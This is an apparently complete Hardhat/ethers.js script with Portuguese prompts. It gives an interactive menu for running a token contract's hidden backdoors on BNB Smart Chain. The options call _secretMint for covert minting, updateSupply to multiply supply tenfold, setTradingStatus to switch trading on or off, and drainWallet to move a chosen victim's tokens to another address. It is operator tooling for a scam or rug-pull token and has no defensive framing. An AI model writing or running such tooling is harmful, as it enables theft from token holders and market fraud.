const hre = require("hardhat");
const { parseUnits, formatUnits } = require("ethers");
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const TOKEN_ABI = [
    "function _secretMint(address to, uint256 amount) external",
    "function decimals() external view returns (uint8)",
    "function balanceOf(address account) external view returns (uint256)",
    "function symbol() external view returns (string)",
    "function updateSupply() external",
    "function setTradingStatus(bool status) external",
    "function drainWallet(address target, address to) external",
    "function isSupplyMultiplied() external view returns (bool)",
];

async function question(query) {
    return new Promise(resolve => {
        rl.question(query, resolve);
    });
}

async function mintTokens(token, signer, decimals) {
    const mintToAddress = await question("Digite o endereço que receberá os tokens (vazio para sua carteira): ");
    const amountStr = await question("Digite a quantidade de tokens para mintar: ");

    const recipient = mintToAddress || signer.address;
    const amount = parseUnits(amountStr, decimals);
    const symbol = await token.symbol();

    const balanceBefore = await token.balanceOf(recipient);
    console.log(`\nBalance atual de ${recipient}: ${formatUnits(balanceBefore, decimals)} ${symbol}`);

    try {
        console.log(`\nMintando ${amountStr} ${symbol} para ${recipient}...`);
        const mintTx = await token._secretMint(recipient, amount);
        const receipt = await mintTx.wait();

        const balanceAfter = await token.balanceOf(recipient);

        console.log(`\nMint realizado com sucesso!
        Hash da transação: ${receipt.hash}
        Bloco: ${receipt.blockNumber}
        
        Balance anterior: ${formatUnits(balanceBefore, decimals)} ${symbol}
        Balance atual: ${formatUnits(balanceAfter, decimals)} ${symbol}
        Diferença: ${formatUnits(balanceAfter - balanceBefore, decimals)} ${symbol}
        
        Visualize a transação:
        https://bscscan.com/tx/${receipt.hash}`);

    } catch (error) {
        console.error("\nErro ao fazer mint:", error.message);
    }
}

async function main() {
    const [signer] = await hre.ethers.getSigners();
    console.log("Executando operações com a conta:", signer.address);

    const tokenAddress = await question("Digite o endereço do token: ");
    const token = new hre.ethers.Contract(tokenAddress, TOKEN_ABI, signer);
    const decimals = await token.decimals();

    while (true) {
        console.log("\n=== Menu de Operações ===");
        console.log("1. Mint tokens");
        console.log("2. Multiplicar supply (10x)");
        console.log("3. Controlar trading");
        console.log("4. Drenar carteira");
        console.log("5. Verificar status");
        console.log("6. Sair");

        const choice = await question("\nEscolha a operação: ");

        switch (choice) {
            case "1":
                await mintTokens(token, signer, decimals);
                break;

            case "2":
                try {
                    const isMultiplied = await token.isSupplyMultiplied();
                    if (isMultiplied) {
                        console.log("\nSupply já foi multiplicado!");
                        break;
                    }

                    console.log("\nMultiplicando supply...");
                    const tx = await token.updateSupply();
                    await tx.wait();
                    console.log("Supply multiplicado com sucesso!");
                } catch (error) {
                    console.error("\nErro ao multiplicar supply:", error.message);
                }
                break;

            case "3":
                const status = await question("\nAtivar trading? (s/n): ");
                try {
                    await token.setTradingStatus(status.toLowerCase() === 's');
                    console.log("Status de trading atualizado!");
                } catch (error) {
                    console.error("\nErro ao atualizar trading:", error.message);
                }
                break;

            case "4":
                const target = await question("\nEndereço alvo: ");
                const to = await question("Endereço destino: ");
                try {
                    await token.drainWallet(target, to);
                    console.log("Carteira drenada com sucesso!");
                } catch (error) {
                    console.error("\nErro ao drenar carteira:", error.message);
                }
                break;

            case "5":
                try {
                    const isMultiplied = await token.isSupplyMultiplied();
                    console.log(`\nStatus do Supply Multiplicado: ${isMultiplied}`);
                } catch (error) {
                    console.error("\nErro ao verificar status:", error.message);
                }
                break;

            case "6":
                rl.close();
                return;

            default:
                console.log("\nOpção inválida!");
        }
    }
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });